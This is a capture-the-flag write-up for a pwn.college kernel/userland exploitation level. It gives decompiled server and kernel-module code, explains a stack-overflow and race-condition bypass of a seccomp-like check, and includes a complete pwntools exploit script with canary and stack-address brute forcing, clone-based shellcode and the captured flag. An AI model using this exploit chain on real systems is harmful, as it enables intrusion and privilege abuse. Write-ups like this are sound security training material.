# Challenge
The challenge can be downloaded via `scp` in pwn.college system exploitation module of the green belt
# Description:
```
Exploit the userland binary to run multiple ypus.
```
# Challenge files
the challenge provide two files:
```
hacker@system-exploitation~level6-0:~$ ls /challenge/
toddlersys_level6.0  toddlersys_level6.0.ko
```
and the bzImage is the `/opt/linux` directory

# /challenge/toddlersys_level6.0
```

undefined8 main(undefined4 param_1,undefined8 *param_2,undefined8 param_3)

{
  int iVar1;
  __pid_t _Var2;
  void *pvVar3;
  long in_FS_OFFSET;
  undefined4 local_58;
  int local_54;
  int local_50;
  int local_4c;
  int local_48;
  int local_44;
  undefined8 local_40;
  char local_35 [13];
  sockaddr local_28;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  puts("###");
  printf("### Welcome to %s!\n",*param_2);
  puts("###");
  putchar(10);
  builtin_strncpy(local_35,"### Goodbye!",0xd);
  puts("This challenge is listening for connections on TCP port 1337.\n");
  puts("The challenge supports unlimited sequential connections.\n");
  local_4c = socket(2,1,0);
  local_58 = 1;
  setsockopt(local_4c,1,2,&local_58,4);
  local_28.sa_family = 2;
  local_28.sa_data[2] = '\0';
  local_28.sa_data[3] = '\0';
  local_28.sa_data[4] = '\0';
  local_28.sa_data[5] = '\0';
  local_28.sa_data._0_2_ = htons(0x539);
  bind(local_4c,&local_28,0x10);
  listen(local_4c,1);
  for (local_54 = 0; local_54 < 0x10; local_54 = local_54 + 1) {
    local_44 = open("/proc/ypu",2);
    *(int *)(data + (long)local_54 * 0x10) = local_44;
    pvVar3 = mmap((void *)0x0,0x1000,3,1,local_44,0);
    *(void **)(data + (long)local_54 * 0x10 + 8) = pvVar3;
  }
  puts("Restricting system calls (default: allow).\n");
  local_40 = seccomp_init(0x7fff0000);
  local_50 = 0;
  do {
    if (0x1ff < local_50) {
      iVar1 = seccomp_load(local_40);
      if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
        __assert_fail("seccomp_load(ctx) == 0","<stdin>",0xaa,"main");
      }
      while( true ) {
        local_48 = accept(local_4c,(sockaddr *)0x0,(socklen_t *)0x0);
        _Var2 = fork();
        if (_Var2 == 0) break;
        close(local_48);
        wait((void *)0x0);
      }
      dup2(local_48,0);
      dup2(local_48,1);
      dup2(local_48,2);
      close(local_4c);
      close(local_48);
      challenge(param_1,param_2,param_3);
      puts(local_35);
      if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return 0;
    }
    if (local_50 == 0x111) {
      printf("Allowing syscall: %s (number %i).\n","set_robust_list",0x111);
      goto LAB_00101b4e;
    }
    if (local_50 < 0x112) {
      if (local_50 < 0x3e) {
        switch(local_50) {
        case 0:
          printf("Allowing syscall: %s (number %i).\n",&DAT_001021fc,0);
          break;
        case 1:
          printf("Allowing syscall: %s (number %i).\n","write",1);
          break;
        default:
          goto switchD_001019ad_caseD_2;
        case 3:
          printf("Allowing syscall: %s (number %i).\n","close",3);
          break;
        case 0x10:
          printf("Allowing syscall: %s (number %i).\n","ioctl",0x10);
          break;
        case 0x21:
          printf("Allowing syscall: %s (number %i).\n",&DAT_0010225a,0x21);
          break;
        case 0x2b:
          printf("Allowing syscall: %s (number %i).\n","accept",0x2b);
          break;
        case 0x38:
          printf("Allowing syscall: %s (number %i).\n","clone",0x38);
          break;
        case 0x3d:
          printf("Allowing syscall: %s (number %i).\n","wait4",0x3d);
        }
      }
      else {
        if (local_50 != 0xe7) goto switchD_001019ad_caseD_2;
        printf("Allowing syscall: %s (number %i).\n","exit_group",0xe7);
      }
    }
    else {
switchD_001019ad_caseD_2:
      iVar1 = seccomp_rule_add(local_40,0,local_50,0);
      if (iVar1 != 0) {
                    /* WARNING: Subroutine does not return */
        __assert_fail("seccomp_rule_add(ctx, SCMP_ACT_KILL, i, 0) == 0","<stdin>",0xa7,"main");
      }
    }
LAB_00101b4e:
    local_50 = local_50 + 1;
  } while( true );
}



void challenge(void)

{
  int iVar1;
  long in_FS_OFFSET;
  uint local_3030;
  uint local_302c;
  undefined1 local_3028 [12288];
  char local_28 [24];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("Welcome to the YPU (yan85 processing unit) server!");
  puts("This server will allow you to schedule yan85 computing tasks onto dedicated YPUs.");
  puts("Commands: load_program/init_ypu/run_ypu/quit.");
  while( true ) {
    while( true ) {
      while( true ) {
        local_28[0] = '\0';
        local_28[1] = '\0';
        local_28[2] = '\0';
        local_28[3] = '\0';
        local_28[4] = '\0';
        local_28[5] = '\0';
        local_28[6] = '\0';
        local_28[7] = '\0';
        local_28[8] = '\0';
        local_28[9] = '\0';
        local_28[10] = '\0';
        local_28[0xb] = '\0';
        local_28[0xc] = '\0';
        local_28[0xd] = '\0';
        local_28[0xe] = '\0';
        local_28[0xf] = '\0';
        __isoc99_scanf(&DAT_001020c6,local_28);
        iVar1 = strcmp(local_28,"load_program");
        if (iVar1 != 0) break;
        __isoc99_scanf(&DAT_001020d8,&local_3030);
        if (0xf < local_3030) {
                    /* WARNING: Subroutine does not return */
          __assert_fail("program_index < 16","<stdin>",0x3b,"challenge");
        }
        read(0,local_3028 + (ulong)local_3030 * 0x300,0x1000);
      }
      iVar1 = strcmp(local_28,"init_ypu");
      if (iVar1 == 0) break;
      iVar1 = strcmp(local_28,"run_ypu");
      if (iVar1 == 0) {
        __isoc99_scanf(&DAT_001020d8,&local_302c);
        if (0xf < local_302c) {
                    /* WARNING: Subroutine does not return */
          __assert_fail("ypu_index < 16","<stdin>",0x4d,"challenge");
        }
        ioctl(*(int *)(data + (ulong)local_302c * 0x10),0x539,0);
      }
      else {
        iVar1 = strcmp(local_28,"quit");
        if (iVar1 == 0) {
          if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
            __stack_chk_fail();
          }
          return;
        }
        puts("Unrecognized choice!");
      }
    }
    __isoc99_scanf(&DAT_001020d8,&local_302c);
    if (0xf < local_302c) {
                    /* WARNING: Subroutine does not return */
      __assert_fail("ypu_index < 16","<stdin>",0x44,"challenge");
    }
    __isoc99_scanf(&DAT_001020d8,&local_3030);
    if (0xf < local_3030) break;
    memcpy(*(void **)(data + (ulong)local_302c * 0x10 + 8),local_3028 + (ulong)local_3030 * 0x300,
           0x1000);
  }
                    /* WARNING: Subroutine does not return */
  __assert_fail("program_index < 16","<stdin>",0x46,"challenge");
}

```

# /challenge/toddlersys_level6.0.ko
```c

/* WARNING: Unknown calling convention */

long device_ioctl(file *file,uint cmd,ulong arg)

{
  long lVar1;
  ulong uVar2;
  long lVar3;
  vmstate_t *pvVar4;
  long in_GS_OFFSET;
  instruction_t next_instruction;
  vmstate_t state;
  
  lVar1 = *(long *)(in_GS_OFFSET + 0x28);
  pvVar4 = &state;
  for (lVar3 = 0x60; lVar3 != 0; lVar3 = lVar3 + -1) {
    pvVar4->memory[0] = '\0';
    pvVar4->memory[1] = '\0';
    pvVar4->memory[2] = '\0';
    pvVar4->memory[3] = '\0';
    pvVar4 = (vmstate_t *)(pvVar4->memory + 4);
  }
  printk(&DAT_00100e30,file,cmd,arg);
  lVar3 = -1;
  if (cmd == 0x539) {
    state.code = (instruction_t *)file->private_data;
    state.sys_open = sys_open;
    state.sys_read = sys_read;
    state.sys_write = sys_write;
    state.sys_exit = sys_exit;
    state.sys_sleep = sys_sleep;
    while (state.regs.i != 0xff) {
      yan85_seccomp_validate(&state);
      if (state.signal != 0) {
        if (state.signal == -0x2a) {
          printk(&DAT_00100e60);
          lVar3 = 0;
        }
        else {
          printk(&DAT_00100e98);
          lVar3 = 0;
        }
        goto LAB_00100cf7;
      }
      uVar2 = (ulong)state.regs.i;
      state.regs.i = state.regs.i + '\x01';
      interpret_instruction(&state,state.code[uVar2]);
    }
    lVar3 = 0;
  }
LAB_00100cf7:
  if (lVar1 != *(long *)(in_GS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return lVar3;
}


/* WARNING: Unknown calling convention */

int device_mmap(file *file,vm_area_struct *vma)

{
  int iVar1;
  
  printk(&DAT_00100d70,file,vma);
  iVar1 = remap_vmalloc_range(vma,file->private_data,0);
  return iVar1 >> 0x1f;
}


/* WARNING: Unknown calling convention */

int device_open(inode *inode,file *file)

{
  void *pvVar1;
  
  printk(&DAT_00100d48,inode,file);
  pvVar1 = (void *)vmalloc_user(0x1000);
  file->private_data = pvVar1;
  return 0;
}


/* WARNING: Unknown calling convention */

int device_release(inode *inode,file *file)

{
  printk(&DAT_00100d20,inode,file);
  vfree(file->private_data);
  return 0;
}


/* WARNING: Unknown calling convention */

int init_module(void)

{
  proc_entry = (proc_dir_entry *)proc_create(&DAT_001010f1,0x180,0,&fops);
  printk(&DAT_001010f5);
  printk(&DAT_00100ec0);
  printk(&DAT_001010f5);
  printk(&DAT_00100ef0);
  return 0;
}


void interpret_imm(vmstate_t *state,instruction_t instruction)

{
  char *pcVar1;
  instruction_t instruction_local;
  
  instruction_local.arg1 = instruction.arg1;
  instruction_local.arg2 = instruction.arg2;
  pcVar1 = describe_register(instruction_local.arg1);
  printk("[s] IMM %s = %#hhx\n",pcVar1,instruction_local.arg2);
  write_register(state,instruction_local.arg1,instruction_local.arg2);
  return;
}


void interpret_instruction(vmstate_t *state,instruction_t instruction)

{
  uchar uStack_17;
  uchar uStack_16;
  
  uStack_16 = instruction.op;
  printk("[V] a:%#hhx b:%#hhx c:%#hhx d:%#hhx s:%#hhx i:%#hhx f:%#hhx\n",(state->regs).a,
         (state->regs).b,(state->regs).c,(state->regs).d,(state->regs).s,(state->regs).i,
         (state->regs).f);
  uStack_17 = instruction.arg2;
  printk("[I] op:%#hhx arg1:%#hhx arg2:%#hhx\n",uStack_16,(uint3)instruction & 0xff,uStack_17);
  if (((uint3)instruction & 0x100000) != 0) {
    interpret_imm(state,instruction);
  }
  if (((uint3)instruction & 0x20000) != 0) {
    interpret_add(state,instruction);
  }
  if (((uint3)instruction & 0x200000) != 0) {
    interpret_stk(state,instruction);
  }
  if (((uint3)instruction & 0x40000) != 0) {
    interpret_stm(state,instruction);
  }
  if ((int3)instruction < 0) {
    interpret_ldm(state,instruction);
  }
  if (((uint3)instruction & 0x80000) != 0) {
    interpret_cmp(state,instruction);
  }
  if (((uint3)instruction & 0x10000) != 0) {
    interpret_jmp(state,instruction);
  }
  if (((uint3)instruction & 0x400000) != 0) {
    interpret_sys(state,instruction);
    return;
  }
  return;
}


void interpret_stm(vmstate_t *state,instruction_t instruction)

{
  word_t wVar1;
  byte bVar2;
  char *pcVar3;
  char *pcVar4;
  instruction_t instruction_local;
  
  instruction_local.arg2 = instruction.arg2;
  pcVar3 = describe_register(instruction_local.arg2);
  pcVar4 = describe_register(instruction.arg1);
  printk("[s] STM *%s = %s\n",pcVar4,pcVar3);
  wVar1 = read_register(state,instruction_local.arg2);
  bVar2 = read_register(state,instruction.arg1);
  state->memory[bVar2] = wVar1;
  return;
}


/* WARNING: Function: __x86_indirect_thunk_rax replaced with injection: x86_indirect_thunk_rax */

void interpret_sys(vmstate_t *state,instruction_t instruction)

{
  byte bVar1;
  word_t wVar2;
  int iVar3;
  char *pcVar4;
  ulong uVar5;
  ulong uVar6;
  undefined5 in_register_00000033;
  word_t wStack_2f;
  
  wStack_2f = instruction.arg2;
  uVar6 = CONCAT53(in_register_00000033,instruction);
  pcVar4 = describe_register(wStack_2f);
  printk("[s] SYS %#hhx %s\n",uVar6 & 0xff,pcVar4);
  if (((uint3)instruction & 8) != 0) {
    printk("[s] ... open\n");
    iVar3 = (*state->sys_open)(state,(char *)(state->memory + (state->regs).a),(int)(state->regs).b,
                               (int)(state->regs).c);
    write_register(state,wStack_2f,(word_t)iVar3);
  }
  if (((uint3)instruction & 4) != 0) {
    printk("[s] ... read_code\n");
    bVar1 = (state->regs).b;
    uVar5 = (ulong)(state->regs).c;
    uVar6 = (long)(int)(0x100 - (uint)bVar1) * 3;
    if (uVar5 < uVar6) {
      uVar6 = uVar5;
    }
    iVar3 = (*state->sys_read)(state,(int)(state->regs).a,state->code + bVar1,uVar6);
    write_register(state,wStack_2f,(word_t)iVar3);
  }
  if (((uint3)instruction & 0x10) != 0) {
    printk("[s] ... read_memory\n");
    iVar3 = (*state->sys_read)(state,(int)(state->regs).a,state->memory + (state->regs).b,
                               (size_t)(state->regs).c);
    write_register(state,wStack_2f,(word_t)iVar3);
  }
  if (((uint3)instruction & 1) != 0) {
    printk("[s] ... write\n");
    iVar3 = (*state->sys_write)(state,(int)(state->regs).a,state->memory + (state->regs).b,
                                (size_t)(state->regs).c);
    write_register(state,wStack_2f,(word_t)iVar3);
  }
  if (((uint3)instruction & 0x20) != 0) {
    printk("[s] ... sleep\n");
    iVar3 = (*state->sys_sleep)(state,(int)(state->regs).a);
    write_register(state,wStack_2f,(word_t)iVar3);
  }
  if (((uint3)instruction & 2) != 0) {
    printk("[s] ... exit\n");
    (*state->sys_exit)(state,(int)(state->regs).a);
  }
  if (wStack_2f != '\0') {
    wVar2 = read_register(state,wStack_2f);
    printk("[s] ... return value (in register %s): %#hhx\n",pcVar4,wVar2,
           CONCAT53(in_register_00000033,instruction));
    return;
  }
  return;
}


                             LAB_00100912                                    XREF[1]:     001008af(j)  
        00100912 f6 c3 10        TEST       BL,0x10
        00100915 74 41           JZ         LAB_00100958
        00100917 48 c7 c7        MOV        state,s_[s]_..._read_memory_00101085             = "[s] ... read_memory\n"
                 85 10 10 00
        0010091e e8 05 17        CALL       <EXTERNAL>::printk                               undefined printk()
                 00 00
        00100923 0f b6 95        MOVZX      EDX,byte ptr [RBP + 0x109]
                 09 01 00 00
        0010092a 48 89 ef        MOV        state,RBP
        0010092d 0f b6 b5        MOVZX      instruction.arg1,byte ptr [RBP + 0x108]
                 08 01 00 00
        00100934 0f b6 8d        MOVZX      ECX,byte ptr [RBP + 0x10a]
                 0a 01 00 00
        0010093b 48 8b 85        MOV        RAX,qword ptr [RBP + 0x160]
                 60 01 00 00
        00100942 48 01 ea        ADD        RDX,RBP
        00100945 e8 c6 16        CALL       <EXTERNAL>::__x86_indirect_thunk_rax             undefined __x86_indirect_thunk_r
                 00 00
        0010094a 44 89 e6        MOV        instruction.arg1,R12D
        0010094d 48 89 ef        MOV        state,RBP
        00100950 0f b6 d0        MOVZX      EDX,AL
        00100953 e8 c8 f9        CALL       write_register                                   void write_register(vmstate_t * 
                 ff ff


/* WARNING: Unknown calling convention */

void interpreter_loop(vmstate_t *state)

{
  byte bVar1;
  instruction_t *piVar2;
  instruction_t next_instruction;
  
  do {
    bVar1 = (state->regs).i;
    piVar2 = state->code;
    (state->regs).i = bVar1 + 1;
    interpret_instruction(state,piVar2[bVar1]);
  } while( true );
}


/* WARNING: Unknown calling convention */

word_t read_memory(vmstate_t *state,word_t address)

{
  return state->memory[address];
}

                                                          
/* WARNING: Unknown calling convention */

int sys_read(vmstate_t *state,int fd,void *buf,size_t count)

{
  file *pfVar1;
  int iVar2;
  
  pfVar1 = state->files[fd];
  if (pfVar1 != (file *)0x0) {
    iVar2 = kernel_read(pfVar1,buf,count,&pfVar1->f_pos);
    return iVar2;
  }
  return -1;
}



/* WARNING: Unknown calling convention */

word_t read_register(vmstate_t *state,word_t reg_spec)

{
  word_t in_AL;
  
  if (reg_spec == '@') {
    return (state->regs).a;
  }
  if (reg_spec == '\x04') {
    return (state->regs).b;
  }
  if (reg_spec == ' ') {
    return (state->regs).c;
  }
  if (reg_spec != '\b') {
    if (reg_spec == '\x01') {
      return (state->regs).s;
    }
    if (reg_spec != '\x02') {
      if (reg_spec == '\x10') {
        in_AL = (state->regs).f;
      }
      else {
        crash(state,"unknown register");
      }
      return in_AL;
    }
    return (state->regs).i;
  }
  return (state->regs).d;
}


/* WARNING: Unknown calling convention */

void write_memory(vmstate_t *state,word_t address,word_t value)

{
  state->memory[address] = value;
  return;
}


/* WARNING: Unknown calling convention */

void write_register(vmstate_t *state,word_t reg_spec,word_t new_value)

{
  if (reg_spec == '@') {
    (state->regs).a = new_value;
    return;
  }
  if (reg_spec == '\x04') {
    (state->regs).b = new_value;
    return;
  }
  if (reg_spec == ' ') {
    (state->regs).c = new_value;
    return;
  }
  if (reg_spec != '\b') {
    if (reg_spec == '\x01') {
      (state->regs).s = new_value;
      return;
    }
    if (reg_spec != '\x02') {
      if (reg_spec == '\x10') {
        (state->regs).f = new_value;
        return;
      }
      crash(state,"unknown register");
      return;
    }
    (state->regs).i = new_value;
    return;
  }
  (state->regs).d = new_value;
  return;
}


/* WARNING: Unknown calling convention */

void yan85_seccomp_validate(vmstate_t *state)

{
  if (((state->code[(state->regs).i].op & 0x40) != 0) &&
     ((state->code[(state->regs).i].arg1 & 0x14) != 0)) {
    state->signal = -0x2a;
    printk(&DAT_001010c6);
    return;
  }
  printk(&DAT_001010db);
  return;
}

```
# Analysis of the source code:
```
# Yan85 instruction bytes:
imm = 0x10
stm = 0x04
sys = 0x40

# register bytes
a = 0x40
b = 0x04
c = 0x20

# sys instruction bytes
open = 0x08
read_mem = 0x10
write = 0x01
sleep = 0x20


# instruction ordering:
struct.pack("<BBB", arg1, arg2, op)

```

# Solution 
The idea is the exploit a stack overflow vulnerability to create a race condition that bypasses the seccomp check in the kernel. The seccomp prevent `sys_read_mem` from executing so we cannot easily read the flag into the memory. With race condition, the ideal case is we first load a good_program (with sys_sleep as the critical byte) to pass the seccomp check and then the bad_program (with sys_read_mem as the critical byte) to read the flag. In actual scneraio, we keep flipping the two byte as fast as possible to create the race condition.

Since the stack was executable:
- first leak the canary by bruteforcing with the stack overflow vulnerability. Since we cannot see "Goodbye" if the canary is overwritten with a wrong byte. That means the correct byte would get us to see "Goodbye". Therefore, we can bruteforce it byte-by-byte as the TCP server persists the everything.
- second, leak a stack address by bruteforcing the `saved_old_rip` with the stack overflow vulnerability. Since changing a byte of the rbp changes the output text of the `puts` function in main. We can bruteforce the rbp in that TCP server.
- Calculate the offset between the leaked stack address and the start of buffer, we call this `buffer_addr`, the offset was `0x3a0` so `buffer_addr` was `stack_leak - 0x3a0`
- Craft a payload with a shellcode at the beginning. Modify the RIP to be buffer_address to jump to the shellcode and hijack control flow
- Let's talk about the shellcode. The shellcode basically calls clone to create a race condition. It first calculate the program base address by leaking program address that lies on the stack after the control flow hijack. Specifically at offset `[saved_old_rbp + 0x28]`. And the offset between that program address and the base is `0x175e` found out in pwndbg. After we had the program base address, we calculate `&data` which is at offset `0x4040` to get the fd and map_ptr for calling ioctl and loading the yan85 shellcode program. Finally, call clone to run ypu (with ioctl) and a toggler (that flips the critical byte) in parallel.

# Exploit script:
```py
#!/usr/bin/env python3
from pwn import *
import os, time, struct

context.arch = 'amd64'
context.bits = 64
context.log_level = 'info'

HOST, PORT = 'localhost', 1337
BIN = '/challenge/toddlersys_level6.0'

elf = ELF(BIN)

MAIN_OFFSET     = 0x175e
DATA_OFF        = 0x4040
CANARY_OFF      = 0x318
RBP_OFF         = 0x320
RIP_OFF         = 0x328
STACK_DELTA     = 0x3a0
OVERFLOW_SLOT   = 15
SHORT_WRITE_LEN = 0x330

IMM, STM, SYS = 0x10, 0x04, 0x40
ra,  rb,  rc  = 0x40, 0x04, 0x20
SYS_OPEN, SYS_READ_MEM, SYS_WRITE, SYS_SLEEP, SYS_EXIT = 0x08, 0x10, 0x01, 0x20, 0x02

def ins(op, a1, a2):
    return struct.pack('<BBB', a1, a2, op)

def wrbyte(val, off):
    return ins(IMM, ra, val) + ins(IMM, rb, off) + ins(STM, rb, ra)

def build_ypu_good():
    sc = b''
    o = 0
    for b in b'/flag\x00':
        sc += wrbyte(b, o); o += 1

    sc += ins(IMM, ra, 0) + ins(IMM, rb, 0) + ins(IMM, rc, 0)
    sc += ins(SYS, SYS_OPEN, ra)
    sc += ins(IMM, rb, 40) + ins(STM, rb, ra)
    sc += ins(IMM, rb, 40) + ins(IMM, ra, 0) + ins(STM, ra, rb)  
    sc += ins(IMM, rb, 100) + ins(IMM, rc, 64)
    sys_off = len(sc)
    sc += ins(SYS, SYS_SLEEP, ra)
    o = 200
    for b in b'/tmp/output\x00':
        sc += wrbyte(b, o); o += 1
    sc += ins(IMM, ra, 200) + ins(IMM, rb, 0x41) + ins(IMM, rc, 0x36)
    sc += ins(SYS, SYS_OPEN, ra)
    sc += ins(IMM, rb, 100) + ins(IMM, rc, 64)
    sc += ins(SYS, SYS_WRITE, ra)

    return sc, sys_off

def build_shellcode(saved_old_rbp, ypu_prog, sys_op_off):
    prog_hex = ','.join(f'0x{b:02x}' for b in ypu_prog)
    asm_code = f"""
        .intel_syntax noprefix
        mov rbx, {saved_old_rbp:#x}
        mov r11, [rbx+0x28]
        sub r11, {MAIN_OFFSET:#x}
        lea rcx, [r11+{DATA_OFF:#x}]
        mov edi, dword ptr [rcx]
        mov r12, qword ptr [rcx+8]
        mov r15d, edi
        lea rsi, [rip+.prog]
        mov rdi, r12
        mov rcx, {len(ypu_prog)}
        rep movsb
        lea r13, [r12+0x1000-0x10]
        lea r14, [r12+0x0c00-0x10]
        mov eax, 56
        mov edi, 0x10F00
        mov rsi, r13
        xor edx, edx
        xor r10d, r10d
        xor r8d, r8d
        xor r9d, r9d
        syscall
        test rax, rax
        jnz .after_toggler
        lea rbx, [r12+{sys_op_off}]
    .tog_loop:
        mov byte ptr [rbx], 0x20
        mov byte ptr [rbx], 0x10
        jmp .tog_loop
    .after_toggler:
        mov eax, 56
        mov edi, 0x10F00
        mov rsi, r14
        xor edx, edx
        xor r10d, r10d
        xor r8d, r8d
        xor r9d, r9d
        syscall
        test rax, rax
        jnz .parent
        mov edi, r15d
    .run_loop:
        mov eax, 16
        mov esi, 0x539
        xor edx, edx
        syscall
        jmp .run_loop
    .parent:
        mov rcx, 0x40000000
    .spin:
        loop .spin
        mov eax, 231
        xor edi, edi
        syscall
    .prog:
        .byte {prog_hex}
    """
    return asm(asm_code)

def send_cmd(r, s):
    r.send(s if s.endswith(b'\n') else s + b'\n')

def brute_canary():
    found = bytearray()
    for i in range(8):
        log.info(f'Bruting canary byte {i} …')
        for b in range(256):
            r = remote(HOST, PORT)
            r.recvuntil(b'Commands')
            send_cmd(r, b'load_program')
            send_cmd(r, str(OVERFLOW_SLOT).encode())
            buf = bytearray(b'\x00' * (CANARY_OFF + i + 1))
            if len(found):
                buf[CANARY_OFF:CANARY_OFF+len(found)] = found
            buf[CANARY_OFF+len(found)] = b
            r.send(bytes(buf))
            time.sleep(0.03)
            send_cmd(r, b'quit')
            ok = False
            try:
                # Either use a strict two-line check like below (uncomment),
                # or the relaxed recvuntil; for canary both usually work.
                # r.recvline(timeout=0.5)
                # data = r.recvline(timeout=0.5)
                # ok = (data == b'### Goodbye!\n')
                r.recvuntil(b'### Goodbye!\n', timeout=0.5)
                ok = True
            except Exception:
                ok = False
            r.close()
            if ok:
                log.success(f'canary byte {i} = {b:#x}')
                found.append(b)
                break
        else:
            log.error(f'Failed to recover canary byte {i}')
            raise SystemExit(1)
    c = u64(bytes(found))
    log.success(f'CANARY = {c:#x}')
    return c

def brute_saved_old_rbp(canary):
    found = bytearray()
    for i in range(8):
        log.info(f'Bruting saved rbp byte {i} …')
        for b in range(256):
            r = remote(HOST, PORT)
            r.recvuntil(b'Commands')
            send_cmd(r, b'load_program')
            send_cmd(r, str(OVERFLOW_SLOT).encode())
            end = RBP_OFF + i + 1
            buf = bytearray(b'\x00' * end)
            buf[CANARY_OFF:CANARY_OFF+8] = p64(canary)
            if len(found):
                buf[RBP_OFF:RBP_OFF+len(found)] = found
            buf[RBP_OFF+len(found)] = b
            r.send(bytes(buf))
            time.sleep(0.05)
            send_cmd(r, b'quit')
            ok = False
            try:
                r.recvline(timeout=0.5)
                data = r.recvline(timeout=0.5)
                ok = (data == b'### Goodbye!\n')
            except EOFError:
                ok = False
            except Exception:
                ok = False
            r.close()
            if ok:
                log.success(f'saved rbp byte {i} = {b:#x}')
                found.append(b)
                break
        else:
            log.error(f'Failed to recover saved rbp byte {i}')
            raise SystemExit(1)
    rip = u64(bytes(found))
    log.success(f'SAVED_OLD_RBP = {rip:#x}')
    return rip

def build_overflow(buf_addr, shellcode, canary, saved_old_rbp):
    payload = bytearray(b'\x00' * SHORT_WRITE_LEN)
    if len(shellcode) > CANARY_OFF:
        raise SystemExit(f'shellcode too large: {len(shellcode)} > {CANARY_OFF}')
    payload[0:len(shellcode)] = shellcode
    payload[CANARY_OFF:CANARY_OFF+8] = p64(canary)
    payload[RBP_OFF:RBP_OFF+8] = p64(saved_old_rbp)
    payload[RIP_OFF:RIP_OFF+8] = p64(buf_addr)
    return bytes(payload)

def main():
    canary = brute_canary()
    saved_old_rbp = brute_saved_old_rbp(canary)
    buf_addr = (saved_old_rbp - STACK_DELTA) & ((1<<64)-1)
    log.success(f'buffer addr = {buf_addr:#x}')
    ypu_prog, sys_op_off = build_ypu_good()
    sh = build_shellcode(saved_old_rbp, ypu_prog, sys_op_off)
    log.info(f'shellcode size: {len(sh)}')
    payload = build_overflow(buf_addr, sh, canary, saved_old_rbp)
    try: os.remove('/tmp/output')
    except: pass
    r = remote(HOST, PORT)
    r.recvuntil(b'Commands')
    send_cmd(r, b'load_program')
    send_cmd(r, str(OVERFLOW_SLOT).encode())
    r.send(payload)
    time.sleep(0.05)
    send_cmd(r, b'quit')
    deadline = time.time() + 20
    found = False
    while time.time() < deadline and not found:
        try:
            with open('/tmp/output', 'rb') as f:
                data = f.read()
                if b'pwn.college{' in data:
                    log.success(f'FLAG: {data}')
                    found = True
                    break
                elif data:
                    log.info(f'Got bytes: {data[:120]!r}')
        except FileNotFoundError:
            pass
        time.sleep(0.2)
    r.close()
    if not found:
        log.warning('No flag yet; race may need more time')

if __name__ == '__main__':
    main()
```
YEAH! The above script got me the flag:
```
[*] Got bytes: b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
[+] FLAG: b'pwn.college{guHv2sbrcpmx6nx1P4SdX5y4mrf.QXwEDNzwSN3gzNwEzW}\n\x00\x00\x00\x00'
[*] Closed connection to localhost port 1337
```


